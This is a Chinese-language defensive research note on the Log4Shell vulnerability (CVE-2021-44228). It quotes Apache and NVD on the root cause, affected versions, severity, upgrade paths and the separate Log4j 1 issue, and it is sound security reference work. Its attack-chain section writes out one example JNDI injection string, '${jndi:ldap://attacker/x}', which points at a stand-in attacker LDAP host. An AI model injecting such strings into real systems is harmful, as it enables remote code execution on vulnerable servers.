# r823A · Log4Shell / JNDI 注入（CVE-2021-44228）全文实拉（SI · 2026-11-28）

## 一手来源（≥2 独立域，WebFetch 200 全文逐字）
1. Apache Logging Services 官方安全页 `https://logging.apache.org/log4j/2.x/security.html`（WebFetch 200 全文逐字；该页 CVE-2021-44228 条目未提 2.16.0/2.17.0、`log4j2.formatMsgNoLookups`、移除 `JndiLookup` class，如实登记）。
2. NIST NVD `https://nvd.nist.gov/vuln/detail/CVE-2021-44228`（WebFetch 200 全文逐字：官方描述、受影响版本、CVSS 10 CRITICAL）。
诚信：OWASP wiki 旧路径 `https://www.owasp.org/www-community/vulnerabilities/Log4Shell` 返回 404，弃用不冒充来源。

## 独点1 · 根因：日志消息被当成 JNDI 查找指令（加载期 RCE）
- Apache 官方逐字：「**JNDI lookup can be exploited to execute arbitrary code loaded from an LDAP server**」；「In Log4j, the JNDI features used in configurations, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers.」
- 攻击链：不可信输入进入日志消息或其参数 → message lookup substitution 解析 `${jndi:ldap://attacker/x}` 一类表达式 → JNDI 向攻击者 LDAP 端点发起查找 → 返回引用指向远程 codebase → 加载并执行任意代码。**触发点是日志写入这一 sink**，不是请求处理、不是反序列化入口本身。
- 影响面（NVD 逐字）：「Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)」；Apache 页给区间 `[2.0-beta9, 2.3.1) ∪ [2.4, 2.12.2) ∪ [2.13.0, 2.15.0)`。组件仅 `log4j-core`：官方「only the log4j-core JAR file is impacted... Applications using only the log4j-api JAR file without the log4j-core JAR file are not impacted」；NVD「specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects」。
- 严重性：CVSS `10.0 CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)`——网络可达、无需权限与交互、作用域改变、机密性/完整性/可用性全高。

## 独点2 · 缓解有版本梯度：默认禁用 ≠ 功能移除
- NVD 逐字：「From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed.」⇒ 2.15.0 只是把危险行为默认关掉，2.16.0 才把 JNDI 功能彻底移除；把「升到 2.15.0 就一劳永逸」当结论是把默认关闭误读成能力消失。
- Apache 官方修复版本逐字：「Upgrade to Log4j `2.3.1` (for Java 6), `2.12.2` (for Java 7), or `2.15.0` (for Java 8 and later).」按 Java 运行时版本选升级目标，不是一律最新。
- `formatMsgNoLookups=true`（2.15.0 前）、从 jar 移除 `JndiLookup` class 等是事件期应急手段；这两个具体措施**不在本次两份官方来源的该条目里**，不作为「官方原文」引用（如实登记）。

## 独点3 · Log4j 1 是独立 CVE 与独立配置门禁
- Apache 官方逐字：「Log4j 1 has reached End of Life in 2015, and is no longer supported. Vulnerabilities reported after August 2015 against Log4j 1 are not checked and will not be fixed.」
- 「Log4j 1 does not have Lookups, so the risk is lower. Applications using Log4j 1 are only vulnerable to this attack when they use JNDI in their configuration. A separate CVE (CVE-2021-4104) has been filed for this vulnerability. To mitigate, audit your logging configuration to ensure it has no `JMSAppender` configured. Log4j 1 configurations without `JMSAppender` are not impacted by this vulnerability.」
- 判据：Log4j 1 与 Log4j 2 是两条 CVE 与两种缓解路径（审计 JMSAppender vs 升级版本），禁混用「升级到 2.x」去覆盖 1.x。

## 判非 / 去重 / 边界
- 全库 `Log4Shell`/`JNDI 注入`/`CVE-2021-44228`/`message lookup` 在 SKILL.md 0 机制专节；与 §8.3 pickle 模型加载反序列化、§十五 SSRF 出网 URL、§十八 Zip Slip 归档解压、§十七 RAG 入站分工——那些管模型加载/网络出口/文件落盘/入站数据，本节点管**日志消息→JNDI 查找→LDAP 加载代码**这一 sink。豆包自留地 WB 0 落地；按 rules/07「增＝加厚现有」0 新建。
- 不防：非 Log4j 组件的日志注入、Log4j 1 配置里 JMSAppender 之外的风险、JNDI 之外的模板/表达式注入；打补丁不等于清除已落地的恶意 LDAP 引用或后门。
